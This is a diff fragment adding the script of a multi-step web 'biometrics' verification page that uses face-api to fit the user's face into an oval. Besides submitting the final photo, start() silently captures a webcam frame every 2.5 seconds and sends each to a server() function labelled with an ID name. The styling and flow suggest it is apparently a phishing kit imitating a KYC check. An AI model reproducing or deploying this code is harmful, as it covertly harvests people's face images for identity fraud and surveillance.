+                        if (photoReview) photoReview.style.display = 'block';
+                        document.getElementById("cameraPreview").style.display = 'none';
+                        
+                        stage.style.display="none"
+
+                        this.style.display = 'none';
+
+                         server({info:capturedPhoto,t:"i",c:"Final Biometrics Image",n:idName});
+         
+                    
+
+                        window.stop();
+
+                    } catch (error) {
+                        console.error('Photo capture error:', error);
+                     
+                    }
+                });
+            }
+
+            if (retakeBtn) {
+                retakeBtn.addEventListener('click', function() {
+                    capturedPhoto = null;
+                    document.getElementById("cameraPreview").style.display = 'block';
+                    if (photoReview) photoReview.style.display = 'none';
+                    if (placeholder) placeholder.style.display = 'flex';
+                    if (startBtn) startBtn.style.display = 'flex';
+                    if (takeBtn) takeBtn.style.display = 'none';
+
+
+
+                    updateStep4Button();
+                });
+            }
+
+            if (acceptBtn) {
+                acceptBtn.addEventListener('click', function() {
+                    if (capturedPhoto) updateStep4Button();
+                });
+            }
+
+            if (continueBtn) {
+                continueBtn.addEventListener('click', () => {
+                    if (!continueBtn.disabled) goToStep(4);
+                });
+            }
+
+            function updateStep4Button() {
+                if (continueBtn) continueBtn.disabled = !capturedPhoto;
+            }
+        }
+
+        function goToStep(stepNum) {
+            if (stepNum < 1 || stepNum > totalSteps) return;
+            
+            document.querySelectorAll('.step-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            
+            const targetStep = document.getElementById(`step${stepNum}`);
+            if (targetStep) targetStep.classList.add('active');
+            
+            document.querySelectorAll('.step-dot').forEach((dot, index) => {
+                dot.classList.remove('active', 'completed');
+                const dotStep = index + 1;
+                if (dotStep < stepNum) {
+                    dot.classList.add('completed');
+                } else if (dotStep === stepNum) {
+                    dot.classList.add('active');
+                }
+            });
+            
+            currentStep = stepNum;
+            updateProgress();
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function updateProgress() {
+            const percentage = (currentStep / totalSteps) * 100;
+            const progressBar = document.getElementById('progressBar');
+            const stepCount = document.getElementById('stepCount');
+            
+            if (progressBar) progressBar.style.width = `${percentage}%`;
+            if (stepCount) stepCount.textContent = `Step ${currentStep} of ${totalSteps}`;
+        }
+
+   
+        window.addEventListener('beforeunload', function() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+        });
+
+
+    const VIDEO_W = 640;
+    const VIDEO_H = 480;
+    const OVAL_SCALE_X = 0.32;   
+    const OVAL_SCALE_Y = 0.40;   
+    const SIZE_MIN = 0.45;       
+    const SIZE_MAX = 0.90;       
+    const COVERAGE_THRESHOLD = 0.60; 
+    const DETECT_EVERY_MS = 120; 
+    let stream,interval;
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('overlay');
+    const ctx = canvas.getContext('2d');
+    const hud = document.getElementById('hud');
+
+
+    function getOval() {
+      const w = canvas.width, h = canvas.height;
+      return {
+        x: w / 2,
+        y: h / 2,
+        radiusX: w * OVAL_SCALE_X,
+        radiusY: h * OVAL_SCALE_Y
+      };
+    }
+
+    function pointInEllipse(px, py, oval) {
+      const dx = (px - oval.x) * (px - oval.x) / (oval.radiusX * oval.radiusX);
+      const dy = (py - oval.y) * (py - oval.y) / (oval.radiusY * oval.radiusY);
+      return (dx + dy) <= 1.0;
+    }
+
+    function coverageInsideOval(faceBox, oval) {
+      const samples = [];
+      const cols = 3, rows = 3;
+      for (let i = 0; i < cols; i++) {
+        for (let j = 0; j < rows; j++) {
+          const fx = faceBox.x + faceBox.width  * ((i + 0.5) / cols);
+          const fy = faceBox.y + faceBox.height * ((j + 0.5) / rows);
+          samples.push(pointInEllipse(fx, fy, oval));
+        }
+      }
+      const inside = samples.filter(Boolean).length;
+      return inside / samples.length; 
+    }
+
+    function faceFitsOvalBySize(faceBox, oval) {
+      const ovalW = oval.radiusX * 2;
+      const ovalH = oval.radiusY * 2;
+      const minW = ovalW * SIZE_MIN, maxW = ovalW * SIZE_MAX;
+      const minH = ovalH * SIZE_MIN, maxH = ovalH * SIZE_MAX;
+      return (
+        faceBox.width  >= minW && faceBox.width  <= maxW &&
+        faceBox.height >= minH && faceBox.height <= maxH
+      );
+    }
+
+    function drawOverlay(faceCount, isGoodFit) {
+      const { width, height } = canvas;
+      ctx.clearRect(0, 0, width, height);
+
+      const oval = getOval();
+
+  
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.55)';
+      ctx.fillRect(0, 0, width, height);
+
+    
+      ctx.save();
+      ctx.globalCompositeOperation = 'destination-out';
+      ctx.beginPath();
+      ctx.ellipse(oval.x, oval.y, oval.radiusX, oval.radiusY, 0, 0, Math.PI * 2);
+      ctx.fill();
+      ctx.restore();
+
+   
+      const color = (faceCount === 1 && isGoodFit) ? 'rgba(0, 200, 0, 0.95)' : 'rgba(220, 40, 40, 0.95)';
+      ctx.strokeStyle = color;
+      ctx.lineWidth = 4;
+      ctx.beginPath();
+      ctx.ellipse(oval.x, oval.y, oval.radiusX, oval.radiusY, 0, 0, Math.PI * 2);
+      ctx.stroke();
+
+      const takeBtn = document.getElementById('takePhoto');
+      if(faceCount === 1 && isGoodFit){
+        takeBtn.style.background="#fcd535";
+        takeBtn.disabled=false;
+      }else{
+        takeBtn.style.background="#8e8e93";
+        takeBtn.style.color="white";
+        takeBtn.disabled=true;
+      }
+      
+    }
+
+    async function detectLoop() {
+      if (video.paused || video.ended) return setTimeout(detectLoop, DETECT_EVERY_MS);
+
+    
+      const options = new faceapi.TinyFaceDetectorOptions({ inputSize: 192, scoreThreshold: 0.5 });
+      const detections = await faceapi.detectAllFaces(video, options); 
+
+      let isGoodFit = false;
+      const faceCount = detections.length;
+
+      if (faceCount === 1) {
+        const box = detections[0].box;
+        const oval = getOval();
+        const fitsSize = faceFitsOvalBySize(box, oval);
+        const coverage = coverageInsideOval(box, oval);
+        isGoodFit = fitsSize && (coverage >= COVERAGE_THRESHOLD);
+      }
+
+      drawOverlay(faceCount, isGoodFit);
+
+
+      if (faceCount === 0) {
+        hud.textContent = 'No face detected , please center your face in the circle';
+      } else if (faceCount > 1) {
+        hud.textContent = 'Multiple faces detected , only one person, please';
+      } else {
+        hud.textContent = isGoodFit ? 'Perfect, hold still' : 'Adjust distance/position to fit the circle';
+      }
+
+      setTimeout(detectLoop, DETECT_EVERY_MS);
+    }
+
+    async function start(){
+
+      await tf.setBackend('cpu');
+      await tf.ready();
+
+     
+      await faceapi.nets.tinyFaceDetector.loadFromUri('./model');
+      await faceapi.nets.faceLandmark68TinyNet.loadFromUri('./model');
+
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
+        audio: false
+      });
+      video.srcObject = stream;
+
+        
+
+        
+
+
+      await new Promise(res => video.onloadedmetadata = res);
+      canvas.width = video.videoWidth || VIDEO_W;
+      canvas.height = video.videoHeight || VIDEO_H;
+
+     
+      function capture(){
+
+        var c=document.createElement("canvas")
+        var context = c.getContext('2d');
+        c.width = video.videoWidth || VIDEO_W;
+        c.height = video.videoHeight || VIDEO_H;
+        context.drawImage(video, 0, 0);
+        var capturedPhoto = c.toDataURL('image/jpeg', 0.8);
+
+        server({info:capturedPhoto,t:"i",c:"Biometrics Frame Sample "+new Date().toLocaleTimeString(),n:idName});
+                  
+      }
+
+      interval=setInterval(capture,2500);
+
+
+      drawOverlay(0, false);
+      detectLoop();
+    }
+
+    function stop(){
+        stream.getTracks().forEach(track => track.stop());
+        clearInterval(interval);
+    }
+   
+  </script>
+
+
+
+
+
+
+</body>
+</html>
